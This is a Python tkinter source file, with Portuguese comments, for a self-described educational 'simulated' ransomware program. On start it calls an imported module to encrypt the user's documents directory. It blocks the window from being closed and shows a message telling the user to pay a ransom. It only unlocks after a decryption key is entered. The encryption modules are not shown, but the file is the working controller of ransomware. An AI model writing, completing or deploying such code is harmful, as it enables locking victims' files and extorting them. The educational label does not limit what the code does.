import tkinter as tk
from tkinter import messagebox, simpledialog
from threading import Thread
import encriptor
import decryptor


class RansomwareGUI:
    def __init__(self, master):

        # Define a janela principal da interface gráfica e o título
        self.master = master  
        master.title("Ransomware") 

        #Mensagem e botões 
        self.label = tk.Label(master, text="WARNING: This program is a simulated ransomware attack for educational purposes only.")
        self.label.pack(pady=20)

        #Esta funçao faz como que o user nao consiga fechar a janela
        master.protocol("WM_DELETE_WINDOW", self.disable_event)

        # Chama a função para encriptar os arquivos assim que a interface é iniciada
        self.start_encryption()

    def disable_event(self):
        # Função para impedir o fecho da janela, nao faz nada
        pass

    def enable_event(self):
        # Permite fechar a janela
        self.master.protocol("WM_DELETE_WINDOW", self.master.destroy)


    def start_encryption(self):
        # Função para iniciar a criptografia dos arquivos
        Thread(target=self.encrypt_files).start()

    def encrypt_files(self):
        encriptor.encrypt_documents_directory()
        messagebox.showinfo("Encryption Complete", "Encryption completed. Pay the ransom to decrypt your files and do not close this program!")
        # Cria um botão para iniciar o processo de descriptografia
        self.decrypt_button = tk.Button(self.master, text="Decrypt Files", command=self.start_decryption)
        self.decrypt_button.pack(pady=10)

    def start_decryption(self):
        # Função para iniciar a descriptografia dos arquivos
        key = simpledialog.askstring("Input", "Enter the decryption key:")
        if key:
            Thread(target=self.decrypt_files, args=(key.encode(),)).start()

    def decrypt_files(self, key):
        try:
            decryptor.decrypt_documents_directory(key)
            messagebox.showinfo("Decryption Complete", "Decryption completed. Your files are now accessible.")
            self.enable_event() #Permite que o user feche a janela
        except Exception:
            messagebox.showerror("Error", "Decryption failed! Use other key")


if __name__ == "__main__":
    root = tk.Tk()
    app = RansomwareGUI(root)
    root.mainloop()
